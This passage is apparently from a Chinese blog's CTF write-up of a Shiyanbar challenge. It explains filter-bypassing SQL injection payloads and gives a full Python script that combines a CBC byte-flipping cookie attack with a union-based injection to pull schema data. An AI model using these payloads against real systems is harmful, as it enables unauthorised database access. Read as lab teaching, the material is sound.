后面是构造的命令。</p><ul><li>limit后面跟0是为了前面的查询结果不输出，而直接将后面联合查询的结果输出（因为输出只有一行，如果变为1，会输出rootzz，即users表的第一行数据，不是我们想要的）</li><li>2nion 是为了绕过对union的过滤，结合上面的代码将payload序列化，再对相应字符进行字节翻转攻击</li><li>(select 1)a 和 (select 2)b 等是为了凑字段，通过不断叠加，根据报错信息判断users表的字段数，因为应用的是联合查询，前后查询的字段数必须一致，否则会爆 [Err] 1222 - The used SELECT statements have a different number of columns 错误。</li><li>join相当于逗号，逗号被过滤了</li></ul><p>经过判断，有三个字段，因此有以下payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">('0 2nion <span class="keyword">select</span> * <span class="keyword">from</span>((<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema regexp <span class="keyword">database</span>())b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c);'+chr(0),7,'2','u')</span><br><span class="line">("0 2nion <span class="keyword">select</span> * <span class="keyword">from</span>((<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name regexp <span class="string">'you_want'</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c);"+chr(0),7,'2','u')</span><br><span class="line">("0 2nion <span class="keyword">select</span> * <span class="keyword">from</span>((<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="keyword">value</span> <span class="keyword">from</span> you_want)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c);"+chr(0),6,'2','u')</span><br></pre></td></tr></table></figure><p>完整脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote,quote</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_flag</span><span class="params">(payload,index,string1,string2)</span>:</span></span><br><span class="line">	data = &#123;&#125;</span><br><span class="line"></span><br><span class="line">	id = payload</span><br><span class="line"></span><br><span class="line">	submit = <span class="string">'Login'</span></span><br><span class="line"></span><br><span class="line">	data[<span class="string">'id'</span>]=id</span><br><span class="line">	data[<span class="string">'submit'</span>]=submit</span><br><span class="line"></span><br><span class="line">	r = requests.post(url,data)</span><br><span class="line"></span><br><span class="line">	iv=base64.b64decode(unquote(r.cookies[<span class="string">'iv'</span>]))</span><br><span class="line">	cipher=list(base64.b64decode(unquote(r.cookies[<span class="string">'cipher'</span>])))</span><br><span class="line">	plain_1 = <span class="string">"a:1:&#123;s:2:\"id\";s:"</span></span><br><span class="line">	cipher[index]=chr(ord(cipher[index]) ^ ord(string1) ^ ord(string2))<span class="comment">#套用公式，把字符转为ASCII码才能进行异或</span></span><br><span class="line"></span><br><span class="line">	cipher_new = <span class="string">""</span>.join(cipher)</span><br><span class="line">	cipher_new = quote(base64.b64encode(cipher_new))</span><br><span class="line"></span><br><span class="line">	cookies =dict(iv=r.cookies[<span class="string">'iv'</span>],cipher=cipher_new)</span><br><span class="line">	rr = requests.get(url,cookies=cookies)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#修复第一块乱码问题</span></span><br><span class="line">	plain_base64=re.findall(<span class="string">"base64_decode\(\'(.*?)\'\)"</span>,rr.content)[<span class="number">0</span>] <span class="comment">#查找结果后返回的解密值</span></span><br><span class="line">	plain_base64=base64.b64decode(plain_base64)</span><br><span class="line">	iv = list(iv)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">		iv[i] = chr(ord(plain_base64[i]) ^ ord(iv[i]) ^ ord(plain_1[i]));</span><br><span class="line">	iv_new = <span class="string">""</span>.join(iv)</span><br><span class="line">	iv_new = quote(base64.b64encode(iv_new))</span><br><span class="line"></span><br><span class="line">	cookies_2 =dict(iv=iv_new,cipher=cipher_new)</span><br><span class="line">	rrr = requests.get(url,cookies=cookies_2)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> rrr.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_flag(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure><p>PS：这道题服务器貌似出了点问题，一直报错</p></div><footer class="post-footer"><div class="post-tags"><a href="/tags/密码/" rel="tag"># 密码</a> <a href="/tags/sql注入/" rel="tag"># sql注入</a> <a href="/tags/实验吧/" rel="tag"># 实验吧</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2018/12/03/2018-12-2-使用GitHub Pages + hexo + atom建立自己的博客/" rel="next" title="使用GitHub Pages + Hexo + atom建立自己的博客"><i class="fa fa-chevron-left"></i> 使用GitHub Pages + Hexo + atom建立自己的博客</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2018/12/05/学习笔记（20180827）：bool盲注+各种姿势绕过过滤和替换/" rel="prev" title="学习笔记（20180827）：bool盲注+各种姿势绕过过滤和替换">学习笔记（20180827）：bool盲注+各种姿势绕过过滤和替换 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"></div></div></div><div class="comments" id="comments"><div id="lv-container" data-id="city" data-uid="MTAyMC80MTQ3OC8xODAyNQ=="></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Sing1e-D0g"><p class="site-author-name" itemprop="name">Sing1e-D0g</p><p class="site-description motion-element" itemprop="description">孤独的人是可耻的</p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/index.html"><span class="site-state-item-count">3</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/index.html"><span class="site-state-item-count">26</span> <span class="site-state-item-name">标签</span></a></div></nav></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目来源"><span class="nav-number">1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#首先了解几个概念"><span class="nav-number">2.</span> <span class="nav-text">首先了解几个概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-CBC"><span class="nav-number">2.1.</span> <span class="nav-text">1. CBC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-aes-128-cbc加解密"><span class="nav-number">2.2.</span> <span class="nav-text">2. aes-128-cbc加解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-字节翻转攻击"><span class="nav-number">2.3.</span> <span class="nav-text">3. 字节翻转攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试脚本"><span class="nav-number">3.</span> <span class="nav-text">测试脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回到题目"><span class="nav-number">4.</span> <span class="nav-text">回到题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#limit"><span class="nav-number">4.1.</span> <span class="nav-text">limit</span></a></li></ol></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2018</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">Sing1e-D0g</span></div><div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div><span class="post-meta-divider">|</span><div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><script type="text/javascript">!function(e,t){var n,c=e.getElementsByTagName(t)[0];"function"!=typeof LivereTower&&((n=e.createElement(t)).src="https://cdn-city.livere.com/js/embed.dist.js",n.async=!0,c.parentNode.insertBefore(n,c))}(document,"script")</script></body></html><script type="text/javascript" src="/js/src/love.js"></script>